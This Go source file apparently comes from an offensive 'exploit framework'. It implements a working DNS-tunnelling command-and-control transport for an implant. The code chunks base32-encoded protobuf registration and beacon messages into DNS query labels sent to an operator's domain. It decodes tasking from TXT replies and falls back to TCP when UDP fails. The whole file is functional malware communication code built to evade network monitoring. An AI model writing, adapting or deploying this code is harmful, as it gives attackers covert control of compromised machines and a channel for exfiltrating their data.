package transport

import (
	"encoding/base32"
	"fmt"
	"net"
	"strings"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/miekg/dns"
	"google.golang.org/protobuf/proto"
)

var b32Enc = base32.StdEncoding.WithPadding(base32.NoPadding)

// DNSTransport implements the Transport interface for DNS-based C2 communication.
type DNSTransport struct {
	domain    string
	dnsServer string
	sessionID string
}

func NewDNSTransport(domain, dnsServer string) *DNSTransport {
	if !strings.HasSuffix(domain, ".") {
		domain = domain + "."
	}
	if dnsServer == "" {
		dnsServer = "8.8.8.8:53"
	}
	if !strings.Contains(dnsServer, ":") {
		dnsServer = dnsServer + ":53"
	}
	return &DNSTransport{
		domain:    domain,
		dnsServer: dnsServer,
	}
}

func (t *DNSTransport) Register(reg *pb.Register) (*pb.RegisterResponse, error) {
	data, err := proto.Marshal(reg)
	if err != nil {
		return nil, fmt.Errorf("marshal register: %w", err)
	}

	respData, err := t.sendDNS(data, "reg")
	if err != nil {
		return nil, fmt.Errorf("DNS register: %w", err)
	}

	resp := &pb.RegisterResponse{}
	if err := proto.Unmarshal(respData, resp); err != nil {
		return nil, fmt.Errorf("unmarshal register response: %w", err)
	}

	t.sessionID = resp.SessionId
	return resp, nil
}

func (t *DNSTransport) Beacon(beacon *pb.Beacon) (*pb.BeaconResponse, error) {
	data, err := proto.Marshal(beacon)
	if err != nil {
		return nil, fmt.Errorf("marshal beacon: %w", err)
	}

	respData, err := t.sendDNS(data, t.sessionID)
	if err != nil {
		return nil, fmt.Errorf("DNS beacon: %w", err)
	}

	resp := &pb.BeaconResponse{}
	if err := proto.Unmarshal(respData, resp); err != nil {
		return nil, fmt.Errorf("unmarshal beacon response: %w", err)
	}

	return resp, nil
}

func (t *DNSTransport) sendDNS(data []byte, sessionLabel string) ([]byte, error) {
	encoded := strings.ToLower(b32Enc.EncodeToString(data))

	// Calculate max data per label accounting for session label and domain overhead
	// FQDN max = 253 chars. Format: <chunk>.<sessionLabel>.<domain>
	overhead := len(sessionLabel) + len(t.domain) + 2 // dots
	maxChunkLen := 253 - overhead
	if maxChunkLen > 63 {
		maxChunkLen = 63 // DNS label max
	}
	if maxChunkLen <= 0 {
		return nil, fmt.Errorf("DNS domain too long: no room for data")
	}

	var chunks []string
	for len(encoded) > 0 {
		end := maxChunkLen
		if end > len(encoded) {
			end = len(encoded)
		}
		chunks = append(chunks, encoded[:end])
		encoded = encoded[end:]
	}

	var allResponseData []byte

	for i, chunk := range chunks {
		qname := fmt.Sprintf("%s.%s.%s", chunk, sessionLabel, t.domain)

		respData, err := t.queryTXT(qname)
		if err != nil {
			return nil, fmt.Errorf("DNS query chunk %d/%d: %w", i+1, len(chunks), err)
		}

		if len(respData) > 0 {
			allResponseData = append(allResponseData, respData...)
		}
	}

	return allResponseData, nil
}

func (t *DNSTransport) queryTXT(qname string) ([]byte, error) {
	msg := new(dns.Msg)
	msg.SetQuestion(qname, dns.TypeTXT)
	msg.RecursionDesired = true

	client := &dns.Client{
		Net:     "udp",
		Timeout: 10 * time.Second,
	}

	resp, _, err := client.Exchange(msg, t.dnsServer)
	if err != nil {
		// Fallback to TCP
		client.Net = "tcp"
		conn, err2 := net.DialTimeout("tcp", t.dnsServer, 10*time.Second)
		if err2 != nil {
			return nil, fmt.Errorf("DNS UDP failed (%v), TCP fallback also failed: %w", err, err2)
		}
		defer conn.Close()
		dnsConn := &dns.Conn{Conn: conn}
		dnsConn.WriteMsg(msg)
		resp, err = dnsConn.ReadMsg()
		if err != nil {
			return nil, fmt.Errorf("DNS TCP read: %w", err)
		}
	}

	if resp == nil || len(resp.Answer) == 0 {
		return nil, nil
	}

	// Extract TXT record data
	var encoded strings.Builder
	for _, rr := range resp.Answer {
		if txt, ok := rr.(*dns.TXT); ok {
			for _, s := range txt.Txt {
				encoded.WriteString(s)
			}
		}
	}

	if encoded.Len() == 0 {
		return nil, nil
	}

	decoded, err := b32Enc.DecodeString(strings.ToUpper(encoded.String()))
	if err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}

	return decoded, nil
}
